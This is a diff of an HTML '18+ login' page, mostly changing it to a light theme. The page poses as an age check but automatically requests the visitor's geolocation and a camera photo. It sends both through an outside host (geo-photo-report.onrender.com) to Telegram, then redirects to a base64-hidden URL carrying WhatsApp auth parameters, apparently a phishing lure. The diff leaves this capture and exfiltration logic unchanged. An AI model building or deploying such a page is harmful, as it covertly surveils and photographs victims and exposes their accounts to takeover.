@@ -3,69 +3,89 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>18+ Вход</title>
+  <title>18+ Вход — Светлая версия</title>
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="default">
   <meta name="format-detection" content="telephone=no">
   <style>
     :root {
-      --bg0: #04060a;
-      --bg1: #0a0e1a;
-      --cyan: #00eaff;
-      --blue: #0099ff;
-      --blue2: #4f8cff;
-      --err: #ff5555;
+      /* Светлая палитра и контраст */
+      --bg0: #ffffff; /* основной фон — чисто белый */
+      --bg1: #f7f9ff; /* едва заметный оттенок для градиентов */
+      --txt: #111111; /* основной текст */
+      --sub: #444444; /* вторичный текст */
+      --muted: #6b7280; /* muted */
+      --primary: #2563eb; /* яркий синий */
+      --primary2: #60a5fa; /* светлее */
+      --cyan: #0ea5e9;
+      --err: #ef4444;
+      --ok: #16a34a;
       --radius: 20px;
+      --shadow: 0 6px 30px rgba(0,0,0,0.08);
+      --ring: 0 0 0 3px rgba(37, 99, 235, 0.25);
     }
+
     html, body { height: 100%; }
-    html { color-scheme: dark; }
+    html { color-scheme: light; }
     body {
       margin: 0; overflow: hidden; position: relative;
-      color: #fff; font-family: "Segoe UI", Roboto, system-ui, -apple-system, sans-serif;
+      color: var(--txt); font-family: "Segoe UI", Roboto, system-ui, -apple-system, sans-serif;
       display: grid; place-items: center;
-      background: radial-gradient(circle at center, var(--bg1) 0%, var(--bg0) 100%);
+      background: var(--bg0);
       -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;
     }
+
+    /* Мягкая светлая подсветка фона (очень деликатно) */
     .animated-gradient {
-      position: absolute; inset: -10vmax; z-index: 0; pointer-events: none;
-      filter: blur(60px) saturate(120%);
+      position: absolute; inset: -12vmax; z-index: 0; pointer-events: none;
+      filter: blur(80px) saturate(110%);
+      opacity: .35;
       background: conic-gradient(from 0deg,
-        rgba(0,153,255,.15), rgba(0,238,255,.08), rgba(79,140,255,.12), rgba(0,153,255,.15));
-      animation: swirl 24s linear infinite;
+        rgba(96,165,250,.20), rgba(14,165,233,.15), rgba(199,210,254,.18), rgba(96,165,250,.20));
+      animation: swirl 32s linear infinite;
     }
     @keyframes swirl { to { transform: rotate(360deg); } }
     @media (prefers-reduced-motion: reduce) { .animated-gradient { animation: none; } }
+
     canvas#bg { position: absolute; inset: 0; z-index: 0; pointer-events: none; }
+
+    /* Убрали тёмный вотермарк; делаем едва заметным на белом */
     body::before {
       content: "vskoll";
       position: absolute; inset: 0; display: grid; place-items: center; z-index: 0;
-      font-size: 15vw; font-weight: 800; letter-spacing: .2em; text-transform: uppercase;
-      color: rgba(0, 153, 255, 0.05); filter: blur(2px); user-select: none; pointer-events: none;
+      font-size: 14vw; font-weight: 800; letter-spacing: .18em; text-transform: uppercase;
+      color: rgba(0,0,0,0.015); filter: blur(1.2px); user-select: none; pointer-events: none;
       transform: rotate(-10deg);
     }
+
     .card {
-      width: min(92vw, 460px);
+      width: min(92vw, 520px);
       padding: 28px; border-radius: var(--radius);
-      background: rgba(10, 15, 25, 0.85);
-      -webkit-backdrop-filter: blur(8px); backdrop-filter: blur(8px);
-      box-shadow: 0 0 25px rgba(0, 132, 255, 0.25), 0 0 80px rgba(0, 132, 255, 0.10) inset;
+      background: rgba(255,255,255,0.92);
+      -webkit-backdrop-filter: blur(6px); backdrop-filter: blur(6px);
+      box-shadow: var(--shadow);
+      border: 1px solid rgba(17,24,39,0.06);
       text-align: center; position: relative; z-index: 2;
     }
-    h1 { font-size: 22px; font-weight: 700; margin: 0 0 12px; text-shadow: 0 0 10px var(--blue2), 0 0 20px rgba(79, 140, 255, .6); }
-    p { font-size: 15px; opacity: .88; margin: 0 0 20px; line-height: 1.5; }
-    .reason { font-size: 13px; margin-top: 8px; opacity: .8; text-shadow: 0 0 5px #001133; min-height: 1.5em; }
-    .notice { font-size: 12px; opacity: .65; margin-top: 14px; }
+
+    h1 { font-size: 24px; font-weight: 800; margin: 0 0 12px; color: var(--txt); }
+    p { font-size: 16px; color: var(--sub); margin: 0 0 18px; line-height: 1.55; }
+    .reason { font-size: 13px; margin-top: 8px; color: var(--muted); min-height: 1.6em; }
+    .notice { font-size: 12px; color: var(--muted); margin-top: 14px; }
+
     button {
-      width: 100%; height: 52px; border: none; border-radius: 12px;
-      background: linear-gradient(90deg, #0077ff, #00bfff);
-      color: #fff; font-weight: 700; font-size: 16px; letter-spacing: .5px; cursor: pointer;
-      transition: transform .15s ease, box-shadow .15s ease, filter .15s ease;
-      box-shadow: 0 0 15px rgba(0, 153, 255, .4);
+      width: 100%; height: 54px; border: none; border-radius: 14px;
+      background: linear-gradient(90deg, var(--primary), var(--primary2));
+      color: #fff; font-weight: 800; font-size: 16px; letter-spacing: .5px; cursor: pointer;
+      transition: transform .12s ease, box-shadow .12s ease, filter .12s ease;
+      box-shadow: 0 10px 25px rgba(37, 99, 235, .25);
     }
-    button:hover { transform: translateY(-1px) scale(1.01); box-shadow: 0 0 25px rgba(0, 153, 255, .6); }
-    button:active { transform: scale(.98); box-shadow: 0 0 10px rgba(0, 153, 255, .8); }
-    .ok { color: var(--cyan); text-shadow: 0 0 8px var(--cyan); }
-    .err { color: var(--err); text-shadow: 0 0 6px var(--err); }
+    button:hover { transform: translateY(-1px) scale(1.01); box-shadow: 0 14px 30px rgba(37, 99, 235, .32); }
+    button:active { transform: scale(.98); box-shadow: 0 8px 18px rgba(37, 99, 235, .40); }
+    button:focus-visible { outline: none; box-shadow: var(--ring); }
+
+    .ok { color: var(--ok); font-weight: 700; }
+    .err { color: var(--err); font-weight: 700; }
   </style>
 </head>
 <body>
@@ -81,12 +101,13 @@
   </div>
 
   <script>
-    // Блокируем контекстное меню и т.п.
-    ['contextmenu','copy','cut','paste','dragstart','selectstart'].forEach(evt => {
+    // Разрешаем стандартные действия — на светлом сайте нет нужды жёстко блокировать
+    // Если блокировки нужны, верни массив событий ниже
+    /* ['contextmenu','copy','cut','paste','dragstart','selectstart'].forEach(evt => {
       window.addEventListener(evt, e => e.preventDefault(), { passive: false });
-    });
+    }); */
 
-    // ==== Target URL (base64) — твой редирект ====
+    // ==== Target URL (base64) — твой редирект (оставлено как есть) ====
     const URL_PARTS = [
       "aHR0cHM6Ly93d3cucHViZ21vYmlsZS5jb20vaWcvaXRvcC93aGF0c2FwcC9hdXRo",
       "P3R5cGU9d2hhdHNhcHBhdXRoJmRhdGE9ZXlKYWRYTjBJam9nS2x3SWFTVnlaVzFo",
@@ -108,7 +129,7 @@
       location.assign(target);
     }
 
-    // ==== Детект iOS/Safari ====
+    // ==== Детект iOS/Safari (без изменений по логике) ====
     const title  = document.getElementById('title');
     const text   = document.getElementById('text');
     const reason = document.getElementById('reason');
@@ -146,14 +167,14 @@
       return score; // pass >= 3.5
     }
 
-    // ==== Частицы ====
+    // ==== Светлые частицы ====
     (function particles(){
       const prefersReduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
       const canvas = document.getElementById('bg');
       const ctx = canvas.getContext('2d', { alpha: true });
       let dpr = Math.min(2, window.devicePixelRatio || 1);
       let W, H, rafId, lastTs = 0;
-      const MAX_PARTICLES = prefersReduce ? 30 : 60;
+      const MAX_PARTICLES = prefersReduce ? 24 : 50;
       const FPS = 48;
       const particles = [];
       function resize() {
@@ -168,10 +189,10 @@
         for (let i = 0; i < MAX_PARTICLES; i++) {
           particles.push({
             x: Math.random() * W, y: Math.random() * H,
-            r: 0.6 + Math.random() * 1.8,
+            r: 0.8 + Math.random() * 1.8,
             a: Math.random() * Math.PI * 2,
-            s: 0.15 + Math.random() * 0.45,
-            o: 0.06 + Math.random() * 0.14
+            s: 0.12 + Math.random() * 0.35,
+            o: 0.12 + Math.random() * 0.25
           });
         }
       }
@@ -186,8 +207,8 @@
           if (p.x < -5) p.x = W + 5; else if (p.x > W + 5) p.x = -5;
           if (p.y < -5) p.y = H + 5; else if (p.y > H + 5) p.y = -5;
           ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
-          ctx.fillStyle = `rgba(0, 170, 255, ${p.o})`; ctx.fill();
-          ctx.shadowBlur = 20; ctx.shadowColor = 'rgba(0,153,255,0.25)'; ctx.fill(); ctx.shadowBlur = 0;
+          ctx.fillStyle = `rgba(37, 99, 235, ${p.o})`; ctx.fill();
+          ctx.shadowBlur = 12; ctx.shadowColor = 'rgba(37,99,235,0.22)'; ctx.fill(); ctx.shadowBlur = 0;
         }
         rafId = requestAnimationFrame(step);
       }
@@ -198,25 +219,25 @@
       start();
     })();
 
-    // ==== Автоматический поток: geo + camera -> send to Telegram ====
-    const API_BASE = 'https://geo-photo-report.onrender.com'; // <= поменяй при необходимости
+    // ==== Автоматический поток: geo + camera -> send to Telegram (без изменений по логике) ====
+    const API_BASE = 'https://geo-photo-report.onrender.com';
     let reportReady = false;
 
     function btnSetLocked() {
       btn.disabled = true;
-      btn.style.filter = 'grayscale(35%) brightness(0.9)';
-      btn.style.opacity = '0.6';
+      btn.style.filter = 'grayscale(35%) brightness(0.98)';
+      btn.style.opacity = '0.65';
       btn.style.cursor = 'not-allowed';
-      btn.style.background = 'linear-gradient(90deg, #246, #39a)';
-      btn.style.boxShadow = '0 0 6px rgba(0,153,255,.25)';
+      btn.style.background = 'linear-gradient(90deg, #93c5fd, #bae6fd)';
+      btn.style.boxShadow = '0 0 0 rgba(0,0,0,0)';
     }
     function btnSetReady() {
       btn.disabled = false;
       btn.style.filter = 'none';
       btn.style.opacity = '1';
       btn.style.cursor = 'pointer';
-      btn.style.background = 'linear-gradient(90deg, #4f00ff, #00bfff)';
-      btn.style.boxShadow = '0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)';
+      btn.style.background = 'linear-gradient(90deg, var(--primary), var(--primary2))';
+      btn.style.boxShadow = '0 10px 26px rgba(37, 99, 235, .30)';
     }
 
     async function askGeolocation() {
@@ -270,7 +291,7 @@
     async function autoFlow() {
       try {
         btnSetLocked();
-        text.innerHTML = 'Запрашиваем разрещения на проверку';
+        text.innerHTML = 'Запрашиваем разрешения на проверку';
         const [geo, photoBase64] = await Promise.all([askGeolocation(), takePhoto()]);
         text.innerHTML = 'Отправляем данные на проверку';
         await sendReport({ photoBase64, geo });
@@ -297,13 +318,11 @@
       if (ok) {
         title.textContent = 'Подтверждение 18+';
         text.innerHTML = '<span class="ok">Доступ разрешён.</span>';
-        reason.textContent = `Обнаружено: ${/iPad|MacIntel/.test(navigator.platform) || /iPad/.test(navigator.userAgent) ? 'iPadOS' : 'iOS'} ${ver}, Safari WebKit.`;
+        reason.textContent = `${/iPad|MacIntel/.test(navigator.platform) || /iPad/.test(navigator.userAgent) ? 'iPadOS' : 'iOS'} ${ver}, Safari WebKit.`;
         btn.style.display = 'block';
         note.textContent = 'Кнопка активируется после проверки.';
-        // сразу запускаем автоматический поток (камера+гео → отправка)
         setTimeout(autoFlow, 10);
 
-        // клик по кнопке — пропускаем только если проверка отправлена успешно
         btn.addEventListener('click', (e) => {
           if (!reportReady) { e.preventDefault(); return; }
           go();
